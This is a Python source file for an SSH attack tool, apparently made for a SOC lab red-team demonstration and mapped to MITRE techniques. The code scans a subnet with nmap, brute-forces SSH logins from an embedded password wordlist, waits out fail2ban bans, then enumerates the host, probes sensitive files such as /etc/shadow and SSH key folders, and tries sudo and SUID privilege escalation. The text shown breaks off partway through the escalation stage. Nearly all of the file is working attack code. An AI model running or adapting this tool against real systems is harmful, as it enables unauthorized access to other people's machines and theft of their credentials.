#!/usr/bin/env python3
# ══════════════════════════════════════════════════════════════
#   redteam.py — SSH Attack Tool  v3.0
#   Operator : Yussef
#   Team     : SOC-Lab Red Team
#   MITRE    : T1046 · T1110 · T1078 · T1082 · T1033
#              T1083 · T1548
#   Stages   : 11-phase full attack lifecycle
#   Usage    : python3 redteam.py
# ══════════════════════════════════════════════════════════════

import os, sys, json, time, socket, subprocess, random, signal
from datetime import datetime

try:
    import paramiko
except ImportError:
    print("[!] Missing: sudo apt install python3-paramiko")
    sys.exit(1)

# ══════════════════════════════════════════════════════════════
#   COLORS
# ══════════════════════════════════════════════════════════════

R  = "\033[31m"
Y  = "\033[33m"
G  = "\033[32m"
C  = "\033[36m"
DM = "\033[2m"
B  = "\033[1m"
M  = "\033[35m"
RS = "\033[0m"

def red(s):     return f"{R}{s}{RS}"
def green(s):   return f"{G}{s}{RS}"
def yellow(s):  return f"{Y}{s}{RS}"
def cyan(s):    return f"{C}{s}{RS}"
def dim(s):     return f"{DM}{s}{RS}"
def bold(s):    return f"{B}{s}{RS}"
def magenta(s): return f"{M}{s}{RS}"

def info(msg):    print(f"{C}[*]{RS} {msg}")
def success(msg): print(f"{G}[+]{RS} {msg}")
def warn(msg):    print(f"{Y}[!]{RS} {msg}")
def fail(msg):    print(f"{R}[-]{RS} {msg}")
def sep():        print(f"{DM}{'━'*60}{RS}")
def sep2():       print(f"{DM}{'─'*60}{RS}")

def ts():
    return dim(datetime.now().strftime("%H:%M:%S"))

# ══════════════════════════════════════════════════════════════
#   CONFIG
# ══════════════════════════════════════════════════════════════

VERSION  = "3.3"
PORT     = 22
USERNAME = "socdemo"
OPERATOR = "Yussef"
TEAM     = "SOC-Lab Red Team"

# ── Demo timing knobs (change here only) ─────────────────────
DEMO_INTER_STAGE_PAUSE = 0.3    # pause between automated stages (s)
DEMO_CMD_PAUSE         = 0.06   # pause between individual SSH commands (s)
DEMO_FILE_PAUSE        = 0.07   # pause between file-probe lines (s)
DEMO_PRIV_PAUSE        = 0.08   # pause between privesc checks (s)
DEMO_AI_STEP_PAUSE     = 0.3    # pause per AI correlation step (s)
DEMO_CONTAINMENT_PAUSE = 1.5    # automated containment display pause (s)
DEMO_PHASE_TRANSITION  = 0.5    # pause between HIGH and CRITICAL phases (s)
DEMO_DRY_RUN_STEP      = 0.05   # dry-run per-entry pause (s)

BASE_DIR     = os.path.expanduser("~/redteam")
EVIDENCE_DIR = os.path.join(BASE_DIR, "evidence")
STATE_FILE   = os.path.join(BASE_DIR, ".state")
ATTACK_LOG   = os.path.join(BASE_DIR, "attack.log")
SESSION_LOG  = os.path.join(BASE_DIR, "session.log")

WORDLIST = [
    "123456","password","12345678","qwerty","123456789",
    "12345","1234","111111","1234567","dragon",
    "123123","baseball","abc123","football","kali",    # ← position 15 — demo credential
    "letmein","shadow","master","666666","qwertyuiop",
    "123321","mustang","1234567890","michael","654321",
    "superman","1qaz2wsx","7777777","121212","000000",
    "qazwsx","123qwe","killer","trustno1","jordan",
    "jennifer","zxcvbnm","asdfgh","hunter","buster",
    "soccer","harley","batman","andrew","tigger",
    "sunshine","iloveyou","fuckme","2000","charlie",
    "robert","thomas","hockey","ranger","daniel",
    "starwars","klaster","112233","george","asshole",
    "computer","michelle","jessica","pepper","1111",
    "zxcvbn","555555","11111111","131313","freedom",
    "777777","pass","maggie","159753","aaaaaa",
    "monkey",                                    
    "ginger","princess","joshua","cheese","amanda",
    "summer","love","ashley","6969","nicole",
    "chelsea","biteme","matthew","access","yankees",
    "987654321","dallas","austin","thunder","taylor",
    "matrix","william","corvette","hello","martin",
]

MODE_CONFIG = {
    "high": {
        "delay_min":  0.4,   # was 1.2 — reduced for demo speed
        "delay_max":  0.7,   # was 2.0
        "label":      "HIGH",
        "retry_wait": 5,     # was 30 — reduced fail2ban cooldown
    },
    "critical": {
        "delay_min":  0.05,  # was 0.1
        "delay_max":  0.15,  # was 0.3
        "label":      "CRITICAL",
        "retry_wait": 3,     # was 15
    },
}

# ══════════════════════════════════════════════════════════════
#   STATE & LOGGING
# ══════════════════════════════════════════════════════════════

def load_state():
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE) as f:
            return json.load(f)
    return {}

def save_state(s):
    os.makedirs(BASE_DIR, exist_ok=True)
    with open(STATE_FILE, "w") as f:
        json.dump(s, f, indent=2)

def update_state(**kw):
    s = load_state(); s.update(kw); save_state(s)

def get_run():
    return load_state().get("run", 1)

def get_run_dir(run=None):
    run = run or get_run()
    d = os.path.join(EVIDENCE_DIR, f"run_{run:03d}")
    for sub in ["recon","bruteforce","session",
                "enumeration","sensitive","privesc","correlation"]:
        os.makedirs(os.path.join(d, sub), exist_ok=True)
    return d

def next_run():
    s = load_state()
    old = s.get("run", 1)
    s.update({"run": old+1, "target": None,
               "recon_done": False, "attack_done": False,
               "attack_result": None})
    save_state(s)
    return old, old+1

def alog(msg):
    os.makedirs(BASE_DIR, exist_ok=True)
    ts_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(ATTACK_LOG, "a") as f:
        f.write(f"[{ts_str}] [RUN-{get_run():03d}] {msg}\n")

def slog(msg):
    os.makedirs(BASE_DIR, exist_ok=True)
    ts_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(SESSION_LOG, "a") as f:
        f.write(f"[{ts_str}] {msg}\n")

def save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2)

# ══════════════════════════════════════════════════════════════
#   SIGNAL HANDLER
# ══════════════════════════════════════════════════════════════

def _handle_interrupt(sig, frame):
    print(f"\n\n  {yellow('[!]')} Interrupt — saving partial evidence...")
    s = load_state()
    run = s.get("run", 1)
    ts_str = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    path = os.path.join(get_run_dir(run), "session",
                        f"interrupted_{ts_str}.json")
    save_json(path, {
        "run": run, "timestamp": ts_str, "status": "INTERRUPTED",
        "attacker": get_local_ip(),
        "target": s.get("target", "unknown"),
        "recon_done": s.get("recon_done", False),
        "attack_done": s.get("attack_done", False),
        "operator": OPERATOR,
        "note": "Session interrupted by operator",
    })
    alog(f"INTERRUPTED | Partial evidence saved → {path}")
    print(f"  {green('[+]')} Saved: {dim(path)}\n")
    sys.exit(0)

signal.signal(signal.SIGINT, _handle_interrupt)

# ══════════════════════════════════════════════════════════════
#   NETWORK HELPERS
# ══════════════════════════════════════════════════════════════

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
        return ip
    except Exception:
        return "unknown"

def get_subnet():
    ip = get_local_ip()
    if ip == "unknown": return None, None
    return ".".join(ip.split(".")[:3]) + ".0/24", ip

def progress_bar(cur, total, width=20):
    if total == 0: return f"[{'░'*width}]"
    filled = int(width * cur / total)
    return f"{R}[{'█'*filled}{DM}{'░'*(width-filled)}{R}]{RS}"

# ══════════════════════════════════════════════════════════════
#   PHASE HEADER
# ══════════════════════════════════════════════════════════════

def phase_header(num, name, inc, mitre, tactic, severity):
    sep()
    print(f"  {bold(f'STAGE {num:02d}')}  {bold(name)}")
    sep2()
    info(f"Incident  : {cyan(inc)}")
    info(f"MITRE     : {bold(mitre)}")
    info(f"Tactic    : {dim(tactic)}")
    info(f"Severity  : {severity}")
    info(f"Operator  : {OPERATOR}  {dim('|')}  {dim(TEAM)}")
    info(f"Time      : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    sep()
    print()

def incident_chain(done):
    items = [
        ("INC-001","T1046 Recon"),
        ("INC-002","T1110 Brute Force"),
        ("INC-003","T1078/T1082/T1083/T1548 Post-Access"),
    ]
    print(f"\n  {dim('Incident chain:')}")
    for i,(inc,label) in enumerate(items):
        s = green("✓") if i < len(done) and done[i] else (
            yellow("…") if i < len(done) else dim("—"))
        print(f"  {cyan(inc)} {s} {dim(label)}")
    print()

# ══════════════════════════════════════════════════════════════
#   SETUP
# ══════════════════════════════════════════════════════════════

def do_setup():
    os.system("clear")
    _print_main_banner()
    for d in [BASE_DIR, EVIDENCE_DIR]:
        os.makedirs(d, exist_ok=True)
    state = load_state()
    for k, v in {"run":1,"target":None,"recon_done":False,
                  "attack_done":False,"attack_result":None,
                  "setup_time":datetime.now().isoformat()}.items():
        if k not in state: state[k] = v
    save_state(state)
    success(f"Environment ready   {dim(BASE_DIR)}")
    success(f"Wordlist loaded     {dim(f'{len(WORDLIST)} entries | correct at #75')}")
    run_num = state["run"]
    success(f"State initialized   {dim(f'Run #{run_num:03d}')}")
    for tool in ["nmap"]:
        r = subprocess.run(["which", tool], capture_output=True)
        success(f"{tool} available") if r.returncode==0 else warn(f"{tool} not found")
    success(f"paramiko v{paramiko.__version__}")
    print()

def _print_main_banner():
    print(f"\n{R}{B}")
    print("  ██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗")
    print("  ██╔══██╗██╔════╝██╔══██╗       ██╔══╝██╔════╝██╔══██╗████╗ ████║")
    print("  ██████╔╝█████╗  ██║  ██║       ██║   █████╗  ███████║██╔████╔██║")
    print("  ██╔══██╗██╔══╝  ██║  ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║")
    print("  ██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║")
    print("  ╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝")
    print(f"{RS}")
    print(f"  {bold('SSH Attack Tool')}  {dim(f'v{VERSION}')}  "
          f"{dim('T1046·T1110·T1078·T1082·T1033·T1083·T1548')}  "
          f"{dim(f'Op: {OPERATOR}')}\n")

# ══════════════════════════════════════════════════════════════
#   PRE-FLIGHT
# ══════════════════════════════════════════════════════════════

def preflight(target):
    print()
    info("Running pre-flight checks...")
    sep2()
    ok = True
    
    # 1. Ping Check (with retry)
    ping_ok = False
    for _ in range(2):
        r = subprocess.run(["ping", "-c", "1", "-W", "2", target], capture_output=True)
        if r.returncode == 0:
            ping_ok = True
            break
        time.sleep(1)
        
    if ping_ok: 
        success(f"Host reachable          {dim(target)}")
    else: 
        fail(f"Host unreachable        {dim(target)}")
        ok = False

    # 2. SSH TCP Port Check (with reliable retry logic)
    ssh_ok = False
    for _ in range(3):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3.0)
            result = s.connect_ex((target, PORT))
            s.close()
            if result == 0:
                ssh_ok = True
                break
        except Exception:
            pass
        time.sleep(1) # Wait 1 second before retrying

    if ssh_ok:
        success(f"Port {PORT} open              {dim('SSH responding')}")
    else:
        fail(f"Port {PORT} unreachable       {dim('SSH not reachable')}")
        ok = False

    # 3. Utilities Check
    success(f"Wordlist ready          {dim(f'{len(WORDLIST)} passwords')}")
    r = subprocess.run(["which", "nmap"], capture_output=True)
    success("nmap available") if r.returncode == 0 else warn("nmap not found")
    
    sep2()
    if not ok: 
        warn("Pre-flight validation failed: Target or SSH service is down.")
    return ok

def manual_target(reason=""):
    if reason: warn(reason)
    print(f"{C}[?]{RS} Enter target IP (or Enter to cancel): ", end="")
    try:
        ip = input().strip()
        if not ip: return None
        parts = ip.split(".")
        if len(parts)==4 and all(p.isdigit() and 0<=int(p)<=255 for p in parts):
            success(f"Target set: {ip}"); return ip
        fail("Invalid IP."); return None
    except KeyboardInterrupt:
        return None

# ══════════════════════════════════════════════════════════════
#   STAGE 1 — RECON  T1046
# ══════════════════════════════════════════════════════════════

def run_nmap(args, label, timeout=30):
    print(f"  {dim('$')} nmap {' '.join(args)}", flush=True)
    try:
        r = subprocess.run(["nmap"]+args, capture_output=True,
                           text=True, timeout=timeout)
        return r.stdout
    except subprocess.TimeoutExpired:
        warn(f"Timed out — {label}"); return ""
    except FileNotFoundError:
        warn("nmap not found"); return ""

def do_recon(target=None):
    os.system("clear")
    run = get_run()
    print(f"\n{R}{B}")
    print("  ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗")
    print("  ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║")
    print("  ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║")
    print("  ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║")
    print("  ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║")
    print("  ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝")
    print(f"{RS}")
    phase_header(1,"External Reconnaissance","INC-001",
                 "T1046 — Network Service Scanning",
                 "Discovery",yellow("LOW"))

    subnet, my_ip = get_subnet()
    if not subnet:
        target = manual_target("Cannot detect subnet:")
        if target:
            update_state(target=target, recon_done=True,
                         recon_time=datetime.now().isoformat())
            alog(f"INC-001 MANUAL | Target: {target}")
        return target

    info(f"Attacker  : {my_ip}")
    info(f"Subnet    : {subnet}")
    info(f"Run       : #{run:03d}")
    info(f"Severity  : {yellow('LOW')} → escalating on findings")
    sep2()

    start  = datetime.now()
    scans  = {}

    print(f"\n{bold('[01/04]')} {cyan('Host Discovery')}  {dim('ICMP ping sweep')}")
    ping_out = run_nmap(["-sn",subnet,"-T4","--host-timeout","8s",
                         "--exclude",my_ip],"ping sweep",timeout=30)
    scans["host_discovery"] = ping_out

    if not target:
        hosts = [ln.split()[-1].strip("()")
                 for ln in ping_out.splitlines()
                 if "Nmap scan report for" in ln
                 and ln.split()[-1].strip("()") != my_ip]
        if not hosts:
            target = manual_target("No hosts found:")
            if not target: return None
        elif len(hosts)==1:
            target = hosts[0]
            success(f"Target identified: {bold(target)}")
        else:
            print(f"\n{green('[+]')} Live hosts:\n")
            for i,h in enumerate(hosts,1):
                print(f"      {dim(str(i)+'.')} {h}")
            print(f"      {dim('m.')} Manual entry")
            while True:
                try:
                    c = input(f"\n{C}[?]{RS} Select: ").strip().lower()
                    if c=="m": target = manual_target(); break
                    idx = int(c)-1
                    if 0<=idx<len(hosts): target = hosts[idx]; break
                except (ValueError, KeyboardInterrupt):
                    target = manual_target(); break
        if not target: return None

    time.sleep(0.3)

    print(f"\n{bold('[02/04]')} {cyan('Port Scan')}  {dim('TCP SYN — common ports')}")
    port_out = run_nmap(["-p","22,80,443,3306,8080,21,25,53,8443",
                         "-T4",target],"port scan",timeout=30)
    scans["port_scan"] = port_out
    open_ports = []
    for ln in port_out.splitlines():
        if "/tcp" in ln:
            if "open" in ln:
                print(f"  {green('→')} {ln.strip()}")
                open_ports.append(ln.strip().split("/")[0])
            else:
                print(f"  {dim('→')} {dim(ln.strip())}")
    if open_ports:
        info(f"Open ports: {bold(', '.join(open_ports))}")
    time.sleep(0.3)

    print(f"\n{bold('[03/04]')} {cyan('Service Detection')}  {dim('SSH version fingerprint')}")
    ver_out = run_nmap(["-sV","-p","22","-T4","--version-intensity","5",
                        target],"service version",timeout=30)
    scans["service_version"] = ver_out
    for ln in ver_out.splitlines():
        if "ssh" in ln.lower() or "openssh" in ln.lower():
            print(f"  {yellow('→')} {ln.strip()}")
    time.sleep(0.3)

    print(f"\n{bold('[04/04]')} {cyan('OS Detection')}  {dim('TCP/IP fingerprinting')}")
    os_out = run_nmap(["-O","--osscan-guess","-T4",target],
                      "OS fingerprint",timeout=30)
    scans["os_detection"] = os_out
    for ln in os_out.splitlines():
        if any(k in ln.lower() for k in ["os:","linux","ubuntu","running","cpe"]):
            print(f"  {yellow('→')} {ln.strip()}")

    duration = str(datetime.now()-start).split(".")[0]

    run_dir = get_run_dir(run)
    ev_dir  = os.path.join(run_dir,"recon")
    ts_str  = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

    with open(os.path.join(ev_dir,f"recon_{ts_str}.txt"),"w") as f:
        f.write(f"Stage 1 — Recon | Run #{run:03d} | {ts_str}\n"
                f"Target: {target} | Attacker: {my_ip}\n"
                f"MITRE: T1046 | Tactic: Discovery\n{'='*50}\n\n")
        for phase, data in scans.items():
            f.write(f"[{phase.upper()}]\n{data}\n{'─'*40}\n\n")

    ev_json = os.path.join(ev_dir,f"recon_{ts_str}.json")
    save_json(ev_json,{
        "stage":1,"incident":"INC-001","run":run,
        "timestamp":ts_str,"target":target,
        "attacker":my_ip,"mitre":"T1046",
        "tactic":"Discovery","severity":"LOW",
        "open_ports":open_ports,"duration":duration,
        "operator":OPERATOR,"team":TEAM,
    })

    sep()
    success(f"{bold('Stage 1 complete — INC-001 opened')}")
    print()
    info(f"Target     : {bold(target)}")
    info(f"Open ports : {bold(', '.join(open_ports)) if open_ports else dim('none')}")
    info(f"Duration   : {duration}")
    info(f"MITRE      : T1046 — Network Service Scanning")
    info(f"Severity   : {yellow('LOW → MEDIUM')} (SSH confirmed)")
    info(f"Evidence   : {dim(ev_json)}")
    sep()
    incident_chain([True,False,False])

    update_state(target=target,recon_done=True,
                 recon_time=datetime.now().isoformat())
    alog(f"INC-001 COMPLETE | T1046 | {target} | {duration}")
    slog(f"STAGE-1 | INC-001 | T1046 | RECON COMPLETE | {target} | {duration}")
    return target

# ══════════════════════════════════════════════════════════════
#   STAGE 2 — BRUTE FORCE  T1110
# ══════════════════════════════════════════════════════════════

def try_ssh(ip, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip,port=PORT,username=USERNAME,
                       password=password,timeout=3)
        return True, client
    except paramiko.AuthenticationException:
        return False, None
    except Exception:
        return None, None

def cooldown(seconds):
    print()
    for i in range(seconds,0,-1):
        bar = progress_bar(seconds-i,seconds,width=16)
        print(f"\r  {yellow('[!]')} Blocked by fail2ban — {bar} "
              f"{dim(f'resuming in {i:2d}s')}  ",end="",flush=True)
        time.sleep(1)
    print(f"\r  {cyan('[*]')} Evasion complete — resuming...{' '*30}\n")

def run_attack(target, mode, dry_run=False):
    cfg   = MODE_CONFIG[mode]
    run   = get_run()
    total = len(WORDLIST)

    if not dry_run:
        # Strict pre-flight check — only proceed if SSH is actually reachable
        if not preflight(target):
            fail("CRITICAL: Target is unreachable or SSH is down.")
            info("Switching to DRY RUN mode to prevent false execution errors.")
            alog("PREFLIGHT FAILED — forced fallback to DRY RUN")
            dry_run = True  # Force dry_run so it skips real connections

    start_ts = datetime.now()

    print(f"\n{R}{B}")
    print("  ███████╗███████╗██╗  ██╗")
    print("  ██╔════╝██╔════╝██║  ██║")
    print("  ███████╗███████╗███████║")
    print("  ╚════██║╚════██║██╔══██║")
    print("  ███████║███████║██║  ██║")
    print("  ╚══════╝╚══════╝╚═╝  ╚═╝")
    print(f"{RS}")
    phase_header(2,"SSH Credential Attack","INC-002",
                 "T1110 — Brute Force","Credential Access",
                 yellow(cfg["label"]) if mode=="high" else red(cfg["label"]))

    info(f"Target    : {bold(f'{target}:{PORT}')}")
    info(f"Username  : {USERNAME}")
    info(f"Wordlist  : {total} entries")
    info(f"Mode      : {yellow(cfg['label']) if mode=='high' else red(cfg['label'])}  "
         f"{dim(str(cfg['delay_min'])+'-'+str(cfg['delay_max'])+'s')}")
    if dry_run: warn("DRY RUN — no real connections")
    sep2()
    print()

    alog(f"INC-002 STARTED [{cfg['label']}{'|DRY' if dry_run else ''}] "
         f"| {target} | {total} entries")

    found=False; attempts=0; retries=0; cred=None; client_ref=None

    for i, password in enumerate(WORDLIST,1):
        ts_now = ts(); attempts += 1

        if dry_run:
            print(f"  {ts_now}  {dim('[DRY]')}  "
                  f"{USERNAME}:{password:<20} {dim('simulated')}")
            time.sleep(DEMO_DRY_RUN_STEP)
            continue

        result, client = try_ssh(target, password)
        alog(f"#{i:03d} | {USERNAME}:{password} | "
             f"{'SUCCESS' if result is True else 'FAILED' if result is False else 'ERROR'}")

        if result is True:
            print(f"  {ts_now}  {green('[+]')}  "
                  f"{USERNAME}:{bold(green(password)):<30} "
                  f"{green('AUTH_SUCCESS')}")
            cred = password; client_ref = client; found = True; break

        elif result is False:
            print(f"  {ts_now}  {red('[-]')}  "
                  f"{USERNAME}:{password:<22} {dim('AUTH_FAILED')}")
        else:
            print(f"  {ts_now}  {yellow('[!]')}  "
                  f"{USERNAME}:{password:<22} "
                  f"{yellow('BLOCKED')}  {dim('fail2ban triggered')}")
            retries += 1
            alog(f"BLOCKED | Retry #{retries} | Waiting {cfg['retry_wait']}s")
            cooldown(cfg["retry_wait"])

        time.sleep(random.uniform(cfg["delay_min"],cfg["delay_max"]))

    if dry_run:
        sep(); success(f"Dry run complete — {total} entries simulated"); sep()
        return None, attempts, retries

    duration = str(datetime.now()-start_ts).split(".")[0]

    if not found:
        sep(); warn("Credential not found in wordlist")
        info(f"Attempts  : {attempts}  |  Retries: {retries}")
        info(f"Duration  : {duration}"); sep()
        _save_bf_evidence(target,mode,attempts,retries,duration,False)
        alog(f"INC-002 FAILED | {attempts} attempts | {duration}")
        return None, attempts, retries

    # Stage 3 — suspicious login banner
    sep()
    print(f"\n  {R}{B}  ╔════════════════════════════════════════════════╗")
    print(f"  ║   STAGE 03 — SUSPICIOUS LOGIN SUCCESS          ║")
    print(f"  ║   T1078 — Valid Accounts (compromised creds)   ║")
    print(f"  ╚════════════════════════════════════════════════╝{RS}\n")
    info(f"Credential : {green(bold(f'{USERNAME}:{cred}'))}")
    info(f"Source IP  : {get_local_ip()}")
    info(f"Target     : {target}:{PORT}")
    info(f"Context    : Success after {attempts} failed attempts")
    info(f"Severity   : {red(bold('CRITICAL'))} — unauthorized access confirmed")
    slog(f"STAGE-3 | INC-003 | T1078 | SUSPICIOUS LOGIN | "
         f"{USERNAME}:{cred} | {target} | after {attempts} attempts")
    print()

    return cred, attempts, retries, client_ref, duration

# ══════════════════════════════════════════════════════════════
#   STAGE 4 — ENUMERATION  T1082 + T1033
# ══════════════════════════════════════════════════════════════

def stage_enumeration(client, target, run):
    print(f"\n{bold('[ STAGE 04 ]')}  {bold('Post-Login Discovery')}")
    sep2()
    info(f"Incident  : {cyan('INC-003')}")
    info(f"MITRE     : T1082 + T1033 — System & User Discovery")
    info(f"Tactic    : Discovery"); info(f"Severity  : {red('CRITICAL')}")
    sep2(); print()

    commands = [
        ("whoami",                                         "whoami",       "Current user"),
        ("id",                                             "id",           "UID/GID/groups"),
        ("hostname",                                       "hostname",     "System hostname"),
        ("uname -r",                                       "kernel",       "Kernel version"),
        ("cat /etc/os-release | head -3",                  "os-release",   "OS details"),
        ("uptime",                                         "uptime",       "System uptime"),
        ("who",                                            "who",          "Logged-in users"),
        ("last | head -5",                                 "last-logins",  "Recent logins"),
        ("ip a | grep 'inet ' | head -4",                  "interfaces",   "Network ifaces"),
        ("ls /home",                                       "home-dirs",    "User home dirs"),
        ("cat /etc/passwd | grep -v nologin | grep -v false | head -10",
                                                           "users",        "Valid users"),
        ("w",                                              "active",       "Active sessions"),
        ("ps aux | wc -l",                                 "processes",    "Process count"),
        ("df -h | head -5",                                "disk",         "Disk usage"),
        ("ss -tlnp 2>/dev/null | head -6",                 "open-ports",   "Listening ports"),
    ]

    results = {}
    print(f"  {dim('─'*56)}")
    for cmd, display, desc in commands:
        try:
            _, stdout, _ = client.exec_command(cmd)
            out   = stdout.read().decode().strip()
            first = out.splitlines()[0] if out else "—"
            results[display] = {"value":first,"desc":desc}
            print(f"  {green('$')} {dim(f'{USERNAME}@{target}:~$')} "
                  f"{cyan(display):<20} {dim('→')}  {yellow(first)}")
            time.sleep(DEMO_CMD_PAUSE)
        except Exception:
            results[display] = {"value":"[error]","desc":desc}
    print(f"  {dim('─'*56)}\n")

    ts_str  = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    ev_path = os.path.join(get_run_dir(run),"enumeration",
                           f"enumeration_{ts_str}.json")
    save_json(ev_path,{
        "stage":4,"incident":"INC-003","run":run,
        "timestamp":ts_str,"target":target,
        "attacker":get_local_ip(),"mitre":["T1082","T1033"],
        "tactic":"Discovery","severity":"CRITICAL",
        "commands_executed":len(results),
        "results":results,"operator":OPERATOR,
    })
    success(f"Stage 4 complete — {len(results)} facts gathered")
    info(f"Evidence : {dim(ev_path)}")
    slog(f"STAGE-4 | INC-003 | T1082+T1033 | ENUMERATION | {target} | "
         f"{len(results)} commands")
    return results

# ══════════════════════════════════════════════════════════════
#   STAGE 5 — SENSITIVE FILE ACCESS  T1083
# ══════════════════════════════════════════════════════════════

def stage_sensitive_access(client, target, run):
    print(f"\n{bold('[ STAGE 05 ]')}  {bold('Sensitive Resource Access Attempt')}")
    sep2()
    info(f"Incident  : {cyan('INC-003')}")
    info(f"MITRE     : T1083 — File and Directory Discovery")
    info(f"Tactic    : Discovery")
    info(f"Severity  : {red('CRITICAL')} — potential data exposure")
    sep2(); print()

    targets = [
        ("/etc/passwd",                "User account database"),
        ("/etc/shadow",                "Password hashes (root-only)"),
        ("/etc/sudoers",               "Sudo privilege rules"),
        ("/root",                      "Root home directory"),
        ("/root/.bash_history",        "Root command history"),
        ("/var/log/auth.log",          "Auth log — SOC evidence"),
        ("/var/log/syslog",            "System log"),
        ("/home/socdemo/.bash_history", "User command history"),
        ("/home/socdemo/.ssh",          "SSH keys directory"),
        ("/tmp",                       "Temp directory"),
        ("/var/www",                   "Web root"),
        ("/etc/crontab",               "Scheduled tasks"),
    ]

    results = {}
    print(f"  {dim('─'*56)}")
    for path, desc in targets:
        try:
            _, stdout, _ = client.exec_command(f"ls -la {path} 2>&1 | head -5")
            out   = stdout.read().decode().strip()
            first = out.splitlines()[0] if out else "—"
            denied = any(k in out.lower()
                         for k in ["permission denied","no such file","cannot"])
            sym    = red("✗") if denied else green("✓")
            status = dim("DENIED") if denied else yellow("ACCESSED")
            results[path] = {"desc":desc,"accessible":not denied,"response":first}
            print(f"  {sym}  {cyan(path):<44} {status}")
            print(f"     {dim('→')} {dim(first[:55])}")
            time.sleep(DEMO_FILE_PAUSE)
        except Exception:
            results[path] = {"desc":desc,"accessible":False,"response":"[error]"}
    print(f"  {dim('─'*56)}\n")

    accessible = [p for p,v in results.items() if v["accessible"]]
    denied_cnt = len(results)-len(accessible)
    info(f"Paths attempted  : {len(results)}")
    info(f"Accessible       : {yellow(str(len(accessible)))}")
    info(f"Permission denied: {green(str(denied_cnt))}  {dim('(hardened)')}")

    ts_str  = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    ev_path = os.path.join(get_run_dir(run),"sensitive",
                           f"sensitive_{ts_str}.json")
    save_json(ev_path,{
        "stage":5,"incident":"INC-003","run":run,
        "timestamp":ts_str,"target":target,
        "attacker":get_local_ip(),"mitre":"T1083",
        "tactic":"Discovery","severity":"CRITICAL",
        "paths_attempted":len(results),
        "paths_accessible":len(accessible),
        "paths_denied":denied_cnt,
        "results":results,"operator":OPERATOR,
    })
    print()
    success(f"Stage 5 complete — sensitive access mapped")
    info(f"Evidence : {dim(ev_path)}")
    slog(f"STAGE-5 | INC-003 | T1083 | SENSITIVE ACCESS | {target} | "
         f"{len(accessible)} accessible / {denied_cnt} denied")
    return results

# ══════════════════════════════════════════════════════════════
#   STAGE 6 — PRIVILEGE ESCALATION  T1548
# ══════════════════════════════════════════════════════════════

def stage_privesc(client, target, run):
    print(f"\n{bold('[ STAGE 06 ]')}  {bold('Privilege Abuse Attempt')}")
    sep2()
    info(f"Incident  : {cyan('INC-003')}")
    info(f"MITRE     : T1548 — Abuse Elevation Control Mechanism")
    info(f"Tactic    : Privilege Escalation")
    info(f"Severity  : {red('CRITICAL')} — escalation attempt")
    sep2(); print()

    checks = [
        ("sudo -l 2>&1",                                       "Sudo privileges check"),
        ("find / -perm -4000 -type f 2>/dev/null | head -8",   "SUID binaries search"),
        ("find / -perm -2000 -type f 2>/dev/null | head -5",   "SGID binaries search"),
        ("cat /etc/crontab 2>&1",                              "Cron jobs inspection"),
        ("ls -la /etc/sudoers.d/ 2>&1",                        "Sudoers.d directory"),
        ("env 2>&1 | head -8",                                 "Environment variables"),
        ("cat /proc/version 2>&1",                             "Kernel version info"),
        ("dpkg -l 2>&1 | grep -i sudo | head -3",              "Sudo package info"),
    ]

    results   = {}
    escalated = False

    print(f"  {dim('─'*56)}")
    for cmd, desc in checks:
        try:
            _, stdout, _ = client.exec_command(cmd)
            out   = stdout.read().decode().strip()
            first = out.splitlines()[0] if out else "—"
            results[desc] = first
            juicy  = any(k in out.lower() for k in ["nopasswd","all","root","suid"])
            sym    = yellow("!") if juicy else dim("·")
            colorf = yellow if juicy else dim
            print(f"  {sym}  {cyan(desc):<42}")
            print(f"     {dim('→')} {colorf(first[:60])}")
            time.sleep(DEMO_PRIV_PAUSE)

            if "nopasswd" in out.lower() and not escalated:
                print(f"\n  {red('[!]')} NOPASSWD detected — attempting escalation...")
                _, so2, _ = client.exec_command("sudo whoami 2>&1")
                sudo_out = so2.read().decode().strip()
                if "root" in sudo_out.lower():
                    print(f"  {red('[!!!]')} {bold(red('PRIVILEGE ESCALATION SUCCESSFUL'))}")
                    print(f"  {red('[!!!]')} sudo whoami → {red(bold(sudo_out))}")
                    escalated = True
                    results["escalation_result"] = f"SUCCESS — root: {sudo_out}"
                    slog(f"STAGE-6 | T1548 | PRIVESC SUCCESS | root confirmed")
                else:
                    print(f"  {green('[+]')} Blocked: {dim(sudo_out)}")
                    results["escalation_result"] = f"BLOCKED — {sudo_out}"
        except Exception:
            results[desc] = "[error]"
    print(f"  {dim('─'*56)}\n")

    if not escalated:
        info(f"Escalation : {green('BLOCKED')}  {dim('(system hardened)')}")
        info(f"Audit log  : {yellow('GENERATED')}  {dim('(T1548 recorded in auditd)')}")
    else:
        warn(f"Escalation : {red(bold('SUCCESS — CRITICAL'))}")

    ts_str  = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    ev_path = os.path.join(get_run_dir(run),"privesc",
                           f"privesc_{ts_str}.json")
    save_json(ev_path,{
        "stage":6,"incident":"INC-003","run":run,
        "timestamp":ts_str,"target":target,
        "attacker":get_local_ip(),"mitre":"T1548",
